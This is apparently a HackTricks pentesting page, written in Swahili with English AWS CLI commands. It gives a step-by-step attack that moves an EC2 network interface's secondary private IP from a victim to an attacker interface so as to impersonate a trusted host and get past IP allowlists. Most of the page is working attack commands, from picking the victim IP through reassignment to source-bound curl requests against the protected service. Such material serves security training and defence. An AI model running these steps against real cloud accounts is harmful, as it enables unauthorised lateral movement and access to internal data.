# AWS â€“ EC2 ENI Secondary Private IP Hijack (Trust/Allowlist Bypass)

{{#include ../../../../banners/hacktricks-training.md}}

Tumia vibaya `ec2:UnassignPrivateIpAddresses` na `ec2:AssignPrivateIpAddresses` kunyang'anya secondary private IP ya ENI ya mwathiriwa na kuihamisha kwenye ENI ya mshambuliaji katika subnet/AZ ile ile. Huduma nyingi za ndani na security groups zinaweka ufikiaji kwa IP maalum za ndani. Kwa kuhamisha anwani hiyo ya sekondari, mshambuliaji anajifanya kuwa mwenyeji anaeaminika kwa L3 na anaweza kufikia huduma zilizokuwa allowlisted.

Prereqs:
- Permissions: `ec2:DescribeNetworkInterfaces`, `ec2:UnassignPrivateIpAddresses` on the victim ENI ARN, and `ec2:AssignPrivateIpAddresses` on the attacker ENI ARN.
- Both ENIs must be in the same subnet/AZ. The target address must be a secondary IP (primary cannot be unassigned).

Variables:
- REGION=us-east-1
- VICTIM_ENI=<eni-xxxxxxxx>
- ATTACKER_ENI=<eni-yyyyyyyy>
- PROTECTED_SG=<sg-protected>   # SG on a target service that allows only $HIJACK_IP
- PROTECTED_HOST=<private-dns-or-ip-of-protected-service>

Steps:
1) Pick a secondary IP from the victim ENI
```bash
aws ec2 describe-network-interfaces --network-interface-ids $VICTIM_ENI --region $REGION   --query NetworkInterfaces[0].PrivateIpAddresses[?Primary==`false`].PrivateIpAddress --output text | head -n1 | tee HIJACK_IP
export HIJACK_IP=$(cat HIJACK_IP)
```
2) Hakikisha host iliyolindwa inaruhusu IP hiyo pekee (idempotent). Ikiwa unatumia SG-to-SG rules badala yake, ruka.
```bash
aws ec2 authorize-security-group-ingress --group-id $PROTECTED_SG --protocol tcp --port 80   --cidr "$HIJACK_IP/32" --region $REGION || true
```
3) Misingi: kutoka kwenye attacker instance, ombi kwa PROTECTED_HOST linapaswa kushindwa bila chanzo kilichodanganywa (kwa mfano, kupitia SSM/SSH)
```bash
curl -sS --max-time 3 http://$PROTECTED_HOST || true
```
4) Ondoa secondary IP kutoka kwenye ENI ya mwathiriwa
```bash
aws ec2 unassign-private-ip-addresses --network-interface-id $VICTIM_ENI   --private-ip-addresses $HIJACK_IP --region $REGION
```
5) Tenga IP ile ile kwa attacker ENI (kwenye AWS CLI v1 ongeza `--allow-reassignment`)
```bash
aws ec2 assign-private-ip-addresses --network-interface-id $ATTACKER_ENI   --private-ip-addresses $HIJACK_IP --region $REGION
```
6) Thibitisha umiliki umehamishwa
```bash
aws ec2 describe-network-interfaces --network-interface-ids $ATTACKER_ENI --region $REGION   --query NetworkInterfaces[0].PrivateIpAddresses[].PrivateIpAddress --output text | grep -w $HIJACK_IP
```
7) Kutoka kwenye attacker instance, source-bind kwa hijacked IP ili kufikia protected host (hakikisha IP imewekwa kwenye OS; ikiwa haijawekwa, ongeza kwa `ip addr add $HIJACK_IP/<mask> dev eth0`)
```bash
curl --interface $HIJACK_IP -sS http://$PROTECTED_HOST -o /tmp/poc.out && head -c 80 /tmp/poc.out
```
## Athari
- Bypass IP allowlists na kuiga trusted hosts ndani ya VPC kwa kusogeza secondary private IPs kati ya ENIs katika subnet/AZ ileile.
- Fikia huduma za ndani ambazo zinakagua ufikiaji kwa specific source IPs, zikiruhusu lateral movement na upatikanaji wa data.
